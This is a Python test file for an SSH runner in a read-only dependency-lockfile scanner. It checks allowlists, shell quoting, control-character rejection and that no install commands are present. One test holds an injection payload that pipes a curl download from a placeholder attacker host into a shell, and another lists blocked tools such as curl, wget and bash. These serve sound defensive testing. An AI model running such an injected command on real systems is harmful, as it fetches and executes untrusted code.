"""Hard safety invariant tests — these tests are load-bearing.
If any of these fail, the skill is broken and must not run."""
import pytest
import shlex
from unittest.mock import patch
import subprocess

from scripts.lib.ssh_runner import SSHRunner, SSHUnreachableError


def test_no_silent_local_fallback_when_ssh_unreachable():
    """S1: SSH unreachable must raise SSHUnreachableError, never run a local command."""
    runner = SSHRunner(host="unreachable.example.invalid", user="nobody")
    with pytest.raises(SSHUnreachableError):
        runner.run(["find", "/var/www", "-name", "package-lock.json"])


def test_ssh_command_allowlist_refuses_disallowed_commands():
    """S3: SSH runner refuses any command not in the allowlist."""
    runner = SSHRunner(host="example.invalid", user="nobody")
    for forbidden in ["mkdir", "tee", "touch", "rm", "scp", "wget", "curl", "bash"]:
        with pytest.raises(ValueError, match="not in SSH allowlist"):
            runner.run([forbidden, "/tmp/foo"])

def test_ssh_command_allowlist_allows_known_commands():
    """S3: SSH runner allows the explicit set of read-syscalls and scanners."""
    # We can't actually run these (no SSH target), but we can verify
    # the allowlist check passes — the failure should come from connectivity, not allowlist.
    runner = SSHRunner(host="example.invalid", user="nobody")
    for allowed in ["find", "cat", "sha256sum", "ls", "stat", "osv-scanner"]:
        with pytest.raises(SSHUnreachableError):  # not ValueError
            runner.run([allowed, "--version"])


import re
from pathlib import Path

SKILL_ROOT = Path(__file__).parent.parent

# S2: forbidden subprocess invocations across the whole script tree
FORBIDDEN_INSTALL_PATTERNS = [
    r'\bnpm\s+install\b',
    r'\bnpm\s+i\b',
    r'\bpnpm\s+install\b',
    r'\byarn\s+install\b',
    r'\byarn\s+add\b',
    r'\bpip\s+install\b(?!.*--dry-run)(?!.*--require-hashes)',
    r'\bcargo\s+install\b',
    r'\bgem\s+install\b',
    r'\bbundle\s+install\b',
    r'\bgo\s+install\b',
]

def test_no_package_manager_install_anywhere_in_scripts():
    """S2: No script in scripts/ may invoke a package-manager install command.
    pkgfence reads lockfiles; it never installs."""
    violations = []
    for py_file in (SKILL_ROOT / "scripts").rglob("*.py"):
        text = py_file.read_text(encoding="utf-8")
        for pattern in FORBIDDEN_INSTALL_PATTERNS:
            if re.search(pattern, text):
                violations.append(f"{py_file}: matches {pattern}")
    assert not violations, "S2 violation: " + "; ".join(violations)


def test_ssh_args_are_shell_quoted_end_to_end():
    """S3: a find-derived path containing shell metacharacters must reach
    the remote shell as ONE quoted operand, never as multiple commands."""
    runner = SSHRunner(host="example.invalid", user="nobody")
    hostile = "/var/www/up;curl evil.example|sh/package-lock.json"
    ssh_cmd = runner._build_ssh_cmd(["sha256sum", hostile])
    remote_string = ssh_cmd[-1]
    # The remote shell will shlex-split this string. It must round-trip
    # to exactly the argv we intended — injection chars stay inside quotes.
    assert shlex.split(remote_string) == ["sha256sum", hostile]


def test_ssh_quoting_preserves_find_grouping_operators():
    """Bare ( and ) survive quoting as literal find operators."""
    runner = SSHRunner(host="example.invalid", user="nobody")
    argv = ["find", "/var/www", "(", "-name", "package-lock.json", ")", "-print"]
    ssh_cmd = runner._build_ssh_cmd(argv)
    assert shlex.split(ssh_cmd[-1]) == argv


def test_ssh_quoting_covers_sudo_prefix():
    runner = SSHRunner(host="example.invalid", user="nobody", use_sudo=True)
    ssh_cmd = runner._build_ssh_cmd(["stat", "/var/www/a b"])
    assert shlex.split(ssh_cmd[-1]) == ["sudo", "-n", "stat", "/var/www/a b"]


def test_ssh_rejects_control_characters_in_any_argument():
    """S3 defense in depth: NUL/CR/LF can never be legitimate in a remote
    argv element and would corrupt line-oriented output parsing."""
    runner = SSHRunner(host="example.invalid", user="nobody")
    for bad in ["/var/www/a\nb", "/var/www/a\rb", "/var/www/a\x00b"]:
        with pytest.raises(ValueError, match="control character"):
            runner.run(["ls", bad])


def test_ssh_identities_only_set_with_keyfile():
    runner = SSHRunner(host="example.invalid", user="nobody", key_file="/k")
    ssh_cmd = runner._build_ssh_cmd(["ls", "/tmp"])
    assert "IdentitiesOnly=yes" in ssh_cmd
